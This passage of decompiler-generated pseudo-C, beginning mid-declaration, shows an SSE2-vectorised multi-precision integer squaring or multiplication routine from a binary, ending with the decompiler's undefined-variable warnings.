  int v215; // edx
  __m128i v216; // xmm7
  __m128i v217; // xmm3
  __m128i v218; // xmm1
  __m128i v219; // xmm3
  __m128i v220; // xmm2
  __m128i v221; // xmm6
  __m128i v222; // xmm7
  __m128i v223; // xmm6
  __m128i v224; // xmm7
  __m128i v225; // xmm5
  __m128i v226; // xmm0
  __m128i v227; // xmm1
  __m128 v228; // xmm6
  __m128 v229; // xmm4
  __m128i v230; // xmm6
  int v231; // ecx
  __m128 v232; // xmm5
  __m128i v233; // xmm4
  __m128i v234; // xmm7
  __m128i v235; // xmm5
  __m128i v236; // xmm6
  __m128i v237; // xmm4
  __m128i v238; // xmm5
  __m128i *v239; // edx
  __m128i v240; // xmm7
  __m128i v241; // xmm6
  __m128i v242; // xmm7
  int result; // eax
  __m128i v244; // xmm6
  __m128i v245; // xmm7
  __m128i v246; // xmm5
  __m128i v247; // xmm0
  __m128i v248; // xmm1
  __m128 v249; // xmm6
  __m128 v250; // xmm4
  __m128i v251; // xmm6
  int v252; // ecx
  __m128 v253; // xmm5
  __m128i v254; // xmm4
  __m128i v255; // xmm7
  __m128i v256; // xmm5
  __m128i v257; // xmm6
  __m128i v258; // xmm4
  __m128i v259; // xmm5
  __m128i *v260; // edx
  __m128i v261; // xmm7
  __m128i v262; // xmm3
  __m128i v263; // xmm1
  __m128i v264; // xmm3
  __m128i v265; // xmm2
  __m128i v266; // xmm6
  __m128i v267; // xmm7
  __m128i v268; // xmm6
  __m128i v269; // xmm7
  __m128i v270; // xmm5
  __m128i v271; // xmm0
  __m128i v272; // xmm1
  __m128 v273; // xmm6
  __m128 v274; // xmm4
  __m128i v275; // xmm6
  __m128 v276; // xmm5
  __m128i v277; // xmm4
  __m128i v278; // xmm7
  __m128i v279; // xmm5
  __m128i v280; // xmm6
  __m128i v281; // xmm4
  __m128i v282; // xmm5
  __m128i v283; // xmm7
  __m128i v284; // xmm6
  __m128i v285; // xmm7
  __m128i v286; // xmm6
  __m128i v287; // xmm7
  __m128i v288; // xmm0
  __m128i v289; // xmm1
  __m128i v290; // xmm4
  __m128i v291; // xmm5
  __m128i v292; // xmm6
  __m128i v293; // xmm5
  __m128i v294; // xmm4
  __m128i v295; // xmm7
  __m128i v296; // xmm0
  __m128i v297; // xmm7
  __m128i v298; // xmm6
  __m128i v299; // xmm2
  __m128i v300; // xmm5
  __m128i v301; // xmm6
  __m128i v302; // xmm7
  __m128i v303; // xmm0
  __m128i v304; // xmm1
  __m128i v305; // xmm4
  __m128i v306; // xmm5
  __m128i v307; // xmm6
  __m128i v308; // [esp+0h] [ebp-11Ch] BYREF
  __m128i v309; // [esp+10h] [ebp-10Ch] BYREF
  __m128i v310; // [esp+20h] [ebp-FCh] BYREF
  __m128i v311; // [esp+30h] [ebp-ECh] BYREF
  __m128i v312; // [esp+40h] [ebp-DCh] BYREF
  __m128i v313; // [esp+50h] [ebp-CCh] BYREF
  __m128i v314; // [esp+60h] [ebp-BCh] BYREF
  __m128i v315; // [esp+70h] [ebp-ACh] BYREF
  __m128i v316; // [esp+80h] [ebp-9Ch] BYREF
  __m128i v317; // [esp+90h] [ebp-8Ch]
  __m128i v318[7]; // [esp+A0h] [ebp-7Ch]

  for ( i = 0; i != 64; i += 16 )
  {
    v3 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    *(__m128i *)((char *)&v309 + 2 * i) = v3;
    *(__m128i *)((char *)&v309 + 2 * i + 16) = _mm_srli_epi64(v3, 0x20u);
    *(__m128i *)((char *)&v317 + 2 * i) = v4;
    v318[i / 8] = _mm_srli_epi64(v4, 0x20u);
  }
  v5 = _mm_load_si128(&v309);
  v6 = _mm_mul_epu32(v5, v5);
  si128 = _mm_load_si128(&stru_4BACE0);
  v8 = _mm_and_si128(si128, v6);
  v9 = _mm_mul_epu32(v5, v317);
  v10 = _mm_and_si128(si128, v9);
  v11 = _mm_srli_epi32(v9, 0x10u);
  v12 = _mm_move_epi64(v10);
  v13 = _mm_move_epi64(v11);
  v14 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v10, v12), v12), 4);
  v15 = (__m128)_mm_add_epi32(v8, (__m128i)v14);
  v16 = (__m128i)_mm_movehl_ps(v14, v15);
  *(_DWORD *)a1 = _mm_cvtsi128_si32((__m128i)v15);
  v17 = (__m128)_mm_add_epi32(
                  _mm_srli_epi32(v6, 0x10u),
                  _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v11, v13), v13), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v17);
  v18 = _mm_add_epi64(_mm_srli_epi64((__m128i)v15, 0x10u), (__m128i)v17);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v18, 0x30u), v16).m128i_u64[0];
  v19 = _mm_load_si128(&v310);
  v20 = _mm_mul_epu32(_mm_load_si128(&v309), v19);
  v21 = _mm_load_si128(&stru_4BACE0);
  v22 = _mm_and_si128(v21, v20);
  v23 = _mm_srli_epi32(v20, 0x10u);
  v24 = _mm_mul_epu32(v19, v317);
  v25 = _mm_and_si128(v21, v24);
  v26 = _mm_srli_epi32(v24, 0x10u);
  v27 = _mm_add_epi32(v25, v25);
  v28 = _mm_add_epi32(v26, v26);
  v29 = _mm_add_epi32(_mm_add_epi32(v23, v23), _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v30 = _mm_move_epi64(v27);
  v31 = _mm_move_epi64(v28);
  v32 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v30), v30), 4);
  v33 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v22, v22), _mm_loadl_epi64(&v308)), (__m128i)v32);
  v34 = (__m128i)_mm_movehl_ps(v32, v33);
  *(_DWORD *)(a1 + 8) = _mm_cvtsi128_si32((__m128i)v33);
  v35 = (__m128)_mm_add_epi32(v29, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v31), v31), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v35);
  v36 = _mm_add_epi64(_mm_srli_epi64((__m128i)v33, 0x10u), (__m128i)v35);
  *(_QWORD *)(a1 + 10) = v36.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v36, 0x30u), v34).m128i_u64[0];
  v37 = _mm_load_si128(&v311);
  v38 = _mm_mul_epu32(_mm_load_si128(&v309), v37);
  v39 = _mm_load_si128(&stru_4BACE0);
  v40 = _mm_and_si128(v39, v38);
  v41 = _mm_srli_epi32(v38, 0x10u);
  v42 = _mm_mul_epu32(v37, v317);
  v43 = _mm_load_si128(&v310);
  v44 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v310.m128i_i8[8]), v43);
  v45 = _mm_mul_epu32(v43, v43);
  v46 = v39;
  v47 = _mm_add_epi32(_mm_and_si128(v39, v42), _mm_and_si128(v39, v44));
  v48 = _mm_add_epi32(_mm_srli_epi32(v42, 0x10u), _mm_srli_epi32(v44, 0x10u));
  v49 = _mm_add_epi32(v47, v47);
  v50 = _mm_add_epi32(v48, v48);
  v51 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v41, v41), _mm_srli_epi32(v45, 0x10u)),
          _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v52 = _mm_move_epi64(v49);
  v53 = _mm_move_epi64(v50);
  v54 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v49, v52), v52), 4);
  v55 = (__m128)_mm_add_epi32(
                  _mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v40, v40), _mm_and_si128(v46, v45)), _mm_loadl_epi64(&v308)),
                  (__m128i)v54);
  v56 = (__m128i)_mm_movehl_ps(v54, v55);
  *(_DWORD *)(a1 + 16) = _mm_cvtsi128_si32((__m128i)v55);
  v57 = (__m128)_mm_add_epi32(v51, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v50, v53), v53), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v57);
  v58 = _mm_add_epi64(_mm_srli_epi64((__m128i)v55, 0x10u), (__m128i)v57);
  *(_QWORD *)(a1 + 18) = v58.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v58, 0x30u), v56).m128i_u64[0];
  v59 = _mm_load_si128(&v311);
  v60 = _mm_mul_epu32(_mm_load_si128(&v310), v59);
  v61 = _mm_load_si128(&stru_4BACE0);
  v62 = _mm_and_si128(v61, v60);
  v63 = _mm_srli_epi32(v60, 0x10u);
  v64 = _mm_mul_epu32(v59, v318[0]);
  v65 = _mm_and_si128(v61, v64);
  v66 = _mm_srli_epi32(v64, 0x10u);
  sub_44AAA3((int)&v311, &v310);
  v67 = _mm_add_epi32(v65, v65);
  v68 = _mm_add_epi32(v66, v66);
  v69 = _mm_add_epi32(_mm_add_epi32(v63, v63), _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v70 = _mm_move_epi64(v67);
  v71 = _mm_move_epi64(v68);
  v72 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v67, v70), v70), 4);
  v73 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v62, v62), _mm_loadl_epi64(&v308)), (__m128i)v72);
  v74 = (__m128i)_mm_movehl_ps(v72, v73);
  *(_DWORD *)(v75 + 24) = _mm_cvtsi128_si32((__m128i)v73);
  v76 = (__m128)_mm_add_epi32(v69, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v68, v71), v71), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v76);
  v77 = _mm_add_epi64(_mm_srli_epi64((__m128i)v73, 0x10u), (__m128i)v76);
  *(_QWORD *)(v75 + 26) = v77.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v77, 0x30u), v74).m128i_u64[0];
  v78 = _mm_load_si128(&v312);
  v79 = _mm_mul_epu32(_mm_load_si128(&v310), v78);
  v80 = _mm_load_si128(&stru_4BACE0);
  v81 = _mm_and_si128(v80, v79);
  v82 = _mm_srli_epi32(v79, 0x10u);
  v84 = _mm_mul_epu32(v78, *(__m128i *)(v83 - 16));
  sub_44AAA3((int)&v311, &v311);
  v85 = _mm_load_si128(&v311);
  v86 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v311.m128i_i8[8]), v85);
  v87 = _mm_mul_epu32(v85, v85);
  v88 = _mm_load_si128(&stru_4BACE0);
  v89 = _mm_add_epi32(_mm_and_si128(v80, v84), _mm_and_si128(v88, v86));
  v90 = _mm_add_epi32(_mm_srli_epi32(v84, 0x10u), _mm_srli_epi32(v86, 0x10u));
  v91 = _mm_add_epi32(v89, v89);
  v92 = _mm_add_epi32(v90, v90);
  v93 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v82, v82), _mm_srli_epi32(v87, 0x10u)),
          _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v94 = _mm_move_epi64(v91);
  v95 = _mm_move_epi64(v92);
  v96 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v91, v94), v94), 4);
  v97 = (__m128)_mm_add_epi32(
                  _mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v81, v81), _mm_and_si128(v88, v87)), _mm_loadl_epi64(&v308)),
                  (__m128i)v96);
  v98 = (__m128i)_mm_movehl_ps(v96, v97);
  *(_DWORD *)(v99 + 32) = _mm_cvtsi128_si32((__m128i)v97);
  v100 = (__m128)_mm_add_epi32(v93, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v92, v95), v95), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v100);
  v101 = _mm_add_epi64(_mm_srli_epi64((__m128i)v97, 0x10u), (__m128i)v100);
  *(_QWORD *)(v99 + 34) = v101.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v101, 0x30u), v98).m128i_u64[0];
  v102 = _mm_load_si128(&v312);
  v103 = _mm_mul_epu32(_mm_load_si128(&v311), v102);
  v104 = _mm_load_si128(&stru_4BACE0);
  v105 = _mm_and_si128(v104, v103);
  v106 = _mm_srli_epi32(v103, 0x10u);
  v108 = _mm_mul_epu32(v102, *v107);
  v109 = _mm_and_si128(v104, v108);
  v110 = _mm_srli_epi32(v108, 0x10u);
  sub_44AA66();
  v111 = _mm_add_epi32(v109, v109);
  v112 = _mm_add_epi32(v110, v110);
  v113 = _mm_add_epi32(_mm_add_epi32(v106, v106), _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v114 = _mm_move_epi64(v111);
  v115 = _mm_move_epi64(v112);
  v116 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v111, v114), v114), 4);
  v117 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v105, v105), _mm_loadl_epi64(&v308)), (__m128i)v116);
  v118 = (__m128i)_mm_movehl_ps(v116, v117);
  *(_DWORD *)(v119 + 40) = _mm_cvtsi128_si32((__m128i)v117);
  v120 = (__m128)_mm_add_epi32(v113, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v112, v115), v115), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v120);
  v121 = _mm_add_epi64(_mm_srli_epi64((__m128i)v117, 0x10u), (__m128i)v120);
  *(_QWORD *)(v119 + 42) = v121.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v121, 0x30u), v118).m128i_u64[0];
  v122 = _mm_load_si128(&v313);
  v123 = _mm_mul_epu32(_mm_load_si128(&v311), v122);
  v124 = _mm_load_si128(&stru_4BACE0);
  v125 = _mm_and_si128(v124, v123);
  v126 = _mm_srli_epi32(v123, 0x10u);
  v128 = _mm_mul_epu32(v122, *(__m128i *)(v127 - 16));
  sub_44AA66();
  v129 = _mm_load_si128(&v312);
  v130 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v312.m128i_i8[8]), v129);
  v131 = _mm_mul_epu32(v129, v129);
  v132 = _mm_load_si128(&stru_4BACE0);
  v133 = _mm_add_epi32(_mm_and_si128(v124, v128), _mm_and_si128(v132, v130));
  v134 = _mm_add_epi32(_mm_srli_epi32(v128, 0x10u), _mm_srli_epi32(v130, 0x10u));
  v135 = _mm_add_epi32(v133, v133);
  v136 = _mm_add_epi32(v134, v134);
  v137 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v126, v126), _mm_srli_epi32(v131, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v138 = _mm_move_epi64(v135);
  v139 = _mm_move_epi64(v136);
  v140 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v135, v138), v138), 4);
  v141 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v125, v125), _mm_and_si128(v132, v131)),
                     _mm_loadl_epi64(&v308)),
                   (__m128i)v140);
  v142 = (__m128i)_mm_movehl_ps(v140, v141);
  *(_DWORD *)(v143 + 48) = _mm_cvtsi128_si32((__m128i)v141);
  v144 = (__m128)_mm_add_epi32(v137, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v136, v139), v139), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v144);
  v145 = _mm_add_epi64(_mm_srli_epi64((__m128i)v141, 0x10u), (__m128i)v144);
  *(_QWORD *)(v143 + 50) = v145.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v145, 0x30u), v142).m128i_u64[0];
  v146 = _mm_load_si128(&v313);
  v147 = _mm_mul_epu32(_mm_load_si128(&v312), v146);
  v148 = _mm_load_si128(&stru_4BACE0);
  v149 = _mm_and_si128(v148, v147);
  v150 = _mm_srli_epi32(v147, 0x10u);
  v152 = _mm_mul_epu32(v146, *v151);
  v153 = _mm_and_si128(v148, v152);
  v154 = _mm_srli_epi32(v152, 0x10u);
  sub_44AA29();
  v155 = _mm_add_epi32(v153, v153);
  v156 = _mm_add_epi32(v154, v154);
  v157 = _mm_add_epi32(_mm_add_epi32(v150, v150), _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v158 = _mm_move_epi64(v155);
  v159 = _mm_move_epi64(v156);
  v160 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v155, v158), v158), 4);
  v161 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v149, v149), _mm_loadl_epi64(&v308)), (__m128i)v160);
  v162 = (__m128i)_mm_movehl_ps(v160, v161);
  *(_DWORD *)(v163 + 56) = _mm_cvtsi128_si32((__m128i)v161);
  v164 = (__m128)_mm_add_epi32(v157, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v156, v159), v159), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v164);
  v165 = _mm_add_epi64(_mm_srli_epi64((__m128i)v161, 0x10u), (__m128i)v164);
  *(_QWORD *)(v163 + 58) = v165.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v165, 0x30u), v162).m128i_u64[0];
  v166 = _mm_load_si128(&v314);
  v167 = _mm_mul_epu32(_mm_load_si128(&v312), v166);
  v168 = _mm_load_si128(&stru_4BACE0);
  v169 = _mm_and_si128(v168, v167);
  v170 = _mm_srli_epi32(v167, 0x10u);
  v172 = _mm_mul_epu32(v166, *(__m128i *)(v171 - 16));
  sub_44AA66();
  v173 = _mm_load_si128(&v313);
  v174 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v313.m128i_i8[8]), v173);
  v175 = _mm_mul_epu32(v173, v173);
  v176 = _mm_load_si128(&stru_4BACE0);
  v177 = _mm_add_epi32(_mm_and_si128(v168, v172), _mm_and_si128(v176, v174));
  v178 = _mm_add_epi32(_mm_srli_epi32(v172, 0x10u), _mm_srli_epi32(v174, 0x10u));
  v179 = _mm_add_epi32(v177, v177);
  v180 = _mm_add_epi32(v178, v178);
  v181 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v170, v170), _mm_srli_epi32(v175, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v182 = _mm_move_epi64(v179);
  v183 = _mm_move_epi64(v180);
  v184 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v179, v182), v182), 4);
  v185 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v169, v169), _mm_and_si128(v176, v175)),
                     _mm_loadl_epi64(&v308)),
                   (__m128i)v184);
  v186 = (__m128i)_mm_movehl_ps(v184, v185);
  *(_DWORD *)(v187 + 64) = _mm_cvtsi128_si32((__m128i)v185);
  v188 = (__m128)_mm_add_epi32(v181, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v180, v183), v183), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v188);
  v189 = _mm_add_epi64(_mm_srli_epi64((__m128i)v185, 0x10u), (__m128i)v188);
  *(_QWORD *)(v187 + 66) = v189.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v189, 0x30u), v186).m128i_u64[0];
  v190 = _mm_load_si128(&v314);
  v191 = _mm_mul_epu32(_mm_load_si128(&v313), v190);
  v192 = _mm_load_si128(&stru_4BACE0);
  v193 = _mm_and_si128(v192, v191);
  v194 = _mm_srli_epi32(v191, 0x10u);
  v196 = _mm_mul_epu32(v190, *v195);
  v197 = _mm_and_si128(v192, v196);
  v198 = _mm_srli_epi32(v196, 0x10u);
  sub_44AA66();
  v199 = _mm_add_epi32(v197, v197);
  v200 = _mm_add_epi32(v198, v198);
  v201 = _mm_add_epi32(_mm_add_epi32(v194, v194), _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v202 = _mm_move_epi64(v199);
  v203 = _mm_move_epi64(v200);
  v204 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v199, v202), v202), 4);
  v205 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v193, v193), _mm_loadl_epi64(&v308)), (__m128i)v204);
  v206 = (__m128i)_mm_movehl_ps(v204, v205);
  *(_DWORD *)(v207 + 72) = _mm_cvtsi128_si32((__m128i)v205);
  v208 = (__m128)_mm_add_epi32(v201, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v200, v203), v203), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v208);
  v209 = _mm_add_epi64(_mm_srli_epi64((__m128i)v205, 0x10u), (__m128i)v208);
  *(_QWORD *)(v207 + 74) = v209.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v209, 0x30u), v206).m128i_u64[0];
  v210 = _mm_load_si128(&v315);
  v211 = _mm_mul_epu32(_mm_load_si128(&v313), v210);
  v212 = _mm_load_si128(&stru_4BACE0);
  v213 = _mm_and_si128(v212, v211);
  v214 = _mm_srli_epi32(v211, 0x10u);
  v216 = _mm_mul_epu32(v210, *(__m128i *)(v215 - 16));
  sub_44AAA3((int)&v314, &v314);
  v217 = _mm_load_si128(&v314);
  v218 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v314.m128i_i8[8]), v217);
  v219 = _mm_mul_epu32(v217, v217);
  v220 = _mm_load_si128(&stru_4BACE0);
  v221 = _mm_add_epi32(_mm_and_si128(v212, v216), _mm_and_si128(v220, v218));
  v222 = _mm_add_epi32(_mm_srli_epi32(v216, 0x10u), _mm_srli_epi32(v218, 0x10u));
  v223 = _mm_add_epi32(v221, v221);
  v224 = _mm_add_epi32(v222, v222);
  v225 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v214, v214), _mm_srli_epi32(v219, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v226 = _mm_move_epi64(v223);
  v227 = _mm_move_epi64(v224);
  v228 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v223, v226), v226), 4);
  v229 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v213, v213), _mm_and_si128(v220, v219)),
                     _mm_loadl_epi64(&v308)),
                   (__m128i)v228);
  v230 = (__m128i)_mm_movehl_ps(v228, v229);
  *(_DWORD *)(v231 + 80) = _mm_cvtsi128_si32((__m128i)v229);
  v232 = (__m128)_mm_add_epi32(v225, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v224, v227), v227), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v232);
  v233 = _mm_add_epi64(_mm_srli_epi64((__m128i)v229, 0x10u), (__m128i)v232);
  *(_QWORD *)(v231 + 82) = v233.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v233, 0x30u), v230).m128i_u64[0];
  v234 = _mm_load_si128(&v315);
  v235 = _mm_mul_epu32(_mm_load_si128(&v314), v234);
  v236 = _mm_load_si128(&stru_4BACE0);
  v237 = _mm_and_si128(v236, v235);
  v238 = _mm_srli_epi32(v235, 0x10u);
  v240 = _mm_mul_epu32(v234, *v239);
  v241 = _mm_and_si128(v236, v240);
  v242 = _mm_srli_epi32(v240, 0x10u);
  sub_44AAA3((int)&v315, &v314);
  v244 = _mm_add_epi32(v241, v241);
  v245 = _mm_add_epi32(v242, v242);
  v246 = _mm_add_epi32(_mm_add_epi32(v238, v238), _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v247 = _mm_move_epi64(v244);
  v248 = _mm_move_epi64(v245);
  v249 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v244, v247), v247), 4);
  v250 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v237, v237), _mm_loadl_epi64(&v308)), (__m128i)v249);
  v251 = (__m128i)_mm_movehl_ps(v249, v250);
  *(_DWORD *)(v252 + 88) = _mm_cvtsi128_si32((__m128i)v250);
  v253 = (__m128)_mm_add_epi32(v246, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v245, v248), v248), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v253);
  v254 = _mm_add_epi64(_mm_srli_epi64((__m128i)v250, 0x10u), (__m128i)v253);
  *(_QWORD *)(v252 + 90) = v254.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v254, 0x30u), v251).m128i_u64[0];
  v255 = _mm_load_si128(&v316);
  v256 = _mm_mul_epu32(_mm_load_si128(&v314), v255);
  v257 = _mm_load_si128(&stru_4BACE0);
  v258 = _mm_and_si128(v257, v256);
  v259 = _mm_srli_epi32(v256, 0x10u);
  v261 = _mm_mul_epu32(v255, v260[-1]);
  v262 = _mm_load_si128(&v315);
  v263 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v315.m128i_i8[8]), v262);
  v264 = _mm_mul_epu32(v262, v262);
  v265 = v257;
  v266 = _mm_add_epi32(_mm_and_si128(v257, v261), _mm_and_si128(v257, v263));
  v267 = _mm_add_epi32(_mm_srli_epi32(v261, 0x10u), _mm_srli_epi32(v263, 0x10u));
  v268 = _mm_add_epi32(v266, v266);
  v269 = _mm_add_epi32(v267, v267);
  v270 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v259, v259), _mm_srli_epi32(v264, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v271 = _mm_move_epi64(v268);
  v272 = _mm_move_epi64(v269);
  v273 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v268, v271), v271), 4);
  v274 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v258, v258), _mm_and_si128(v265, v264)),
                     _mm_loadl_epi64(&v308)),
                   (__m128i)v273);
  v275 = (__m128i)_mm_movehl_ps(v273, v274);
  *(_DWORD *)(v252 + 96) = _mm_cvtsi128_si32((__m128i)v274);
  v276 = (__m128)_mm_add_epi32(v270, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v269, v272), v272), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v276);
  v277 = _mm_add_epi64(_mm_srli_epi64((__m128i)v274, 0x10u), (__m128i)v276);
  *(_QWORD *)(v252 + 98) = v277.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v277, 0x30u), v275).m128i_u64[0];
  ++v260;
  v278 = _mm_load_si128(&v316);
  v279 = _mm_mul_epu32(_mm_load_si128(&v315), v278);
  v280 = _mm_load_si128(&stru_4BACE0);
  v281 = _mm_and_si128(v280, v279);
  v282 = _mm_srli_epi32(v279, 0x10u);
  v283 = _mm_mul_epu32(v278, v260[-1]);
  v284 = _mm_and_si128(v280, v283);
  v285 = _mm_srli_epi32(v283, 0x10u);
  v286 = _mm_add_epi32(v284, v284);
  v287 = _mm_add_epi32(v285, v285);
  v288 = _mm_move_epi64(v286);
  v289 = _mm_move_epi64(v287);
  v290 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v281, v281), _mm_loadl_epi64(&v308)),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v286, v288), v288), 4));
  v291 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v282, v282), _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8])),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v287, v289), v289), 4));
  *(_DWORD *)(v252 + 104) = _mm_cvtsi128_si32(v290);
  v292 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v290), 0x10u), _mm_move_epi64(v291));
  v293 = _mm_unpackhi_epi64(v291, v288);
  *(_QWORD *)(v252 + 106) = v292.m128i_i64[0];
  v294 = _mm_add_epi32(_mm_unpackhi_epi64(v290, v288), _mm_srli_epi64(v292, 0x30u));
  v295 = _mm_load_si128(&v316);
  v296 = _mm_mul_epu32(v295, v295);
  v297 = _mm_mul_epu32(v295, *v260);
  v298 = _mm_load_si128(&stru_4BACE0);
  v299 = _mm_and_si128(v298, v296);
  v300 = _mm_add_epi32(v293, _mm_srli_epi32(v296, 0x10u));
  v301 = _mm_and_si128(v298, v297);
  v302 = _mm_srli_epi32(v297, 0x10u);
  v303 = _mm_move_epi64(v301);
  v304 = _mm_move_epi64(v302);
  v305 = _mm_add_epi32(
           _mm_add_epi32(v294, v299),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v301, v303), v303), 4));
  v306 = _mm_add_epi32(v300, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v302, v304), v304), 4));
  *(_DWORD *)(v252 + 112) = _mm_cvtsi128_si32(v305);
  v307 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v305), 0x10u), _mm_move_epi64(v306));
  *(_QWORD *)(v252 + 114) = v307.m128i_i64[0];
  *(_QWORD *)(v252 + 120) = _mm_add_epi64(
                              _mm_add_epi32(_mm_unpackhi_epi64(v305, v303), _mm_srli_epi64(v307, 0x30u)),
                              _mm_slli_epi64(_mm_unpackhi_epi64(v306, v303), 0x10u)).m128i_u64[0];
  return result;
}
// 44AD47: variable 'v75' is possibly undefined
// 44AD94: variable 'v83' is possibly undefined
// 44AE2F: variable 'v99' is possibly undefined
// 44AE7F: variable 'v107' is possibly undefined
// 44AEDF: variable 'v119' is possibly undefined
